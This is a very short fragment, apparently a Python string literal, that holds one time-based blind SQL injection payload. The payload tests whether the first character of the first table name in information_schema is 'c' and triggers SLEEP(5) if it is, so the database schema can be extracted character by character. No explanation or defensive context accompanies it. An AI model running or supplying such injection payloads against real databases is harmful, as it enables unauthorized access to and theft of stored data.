"""


SELECT IF(SUBSTRING((SELECT table_name FROM information_schema.tables  LIMIT 0,1),1,1)='c',SLEEP(5),0); -- abc

"""